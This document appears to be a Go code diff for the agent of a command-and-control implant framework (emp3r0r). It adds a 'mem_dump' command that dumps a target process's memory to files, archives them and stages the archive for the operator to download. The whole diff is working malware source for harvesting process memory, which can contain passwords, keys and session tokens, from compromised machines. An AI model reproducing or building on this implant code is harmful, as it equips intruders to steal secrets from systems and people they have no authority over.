@@ -357,6 +357,37 @@ func C2CommandsHandler(cmdSlice []string) (out string) {
 			out = fmt.Sprintf("File downloaded to %s", *path)
 		}
 
+	case emp3r0r_data.C2CmdMemDump:
+		// !mem_dump --pid <pid> --path <path>
+		pid := flags.IntP("pid", "p", 0, "PID of target process")
+		flags.Parse(cmdSlice[1:])
+		if *pid == 0 {
+			out = fmt.Sprintf("Error: args error: %v", cmdSlice)
+			return
+		}
+		outpath := fmt.Sprintf("%s/%d", RuntimeConfig.AgentRoot, *pid)
+		err = os.MkdirAll(outpath, 0700)
+		if err != nil {
+			out = fmt.Sprintf("Error: %v", err)
+			return
+		}
+		dumped_data, err := util.DumpProcMem(*pid)
+		if err != nil {
+			out = fmt.Sprintf("Error: %v", err)
+			return
+		}
+		for base, data := range dumped_data {
+			filePath := fmt.Sprintf("%s/%d_%d.bin", outpath, *pid, base)
+			err = os.WriteFile(filePath, data, 0600)
+			if err != nil {
+				out = fmt.Sprintf("Error: %v", err)
+				return
+			}
+		}
+		tarball := fmt.Sprintf("%s/%d.tar.xz", outpath, *pid)
+		util.TarXZ(outpath, tarball)
+		out = fmt.Sprintf("Memory dumped, please download %s", tarball)
+
 	default:
 		// let per-platform C2CommandsHandler do the job
 		out = platformC2CommandsHandler(cmdSlice)
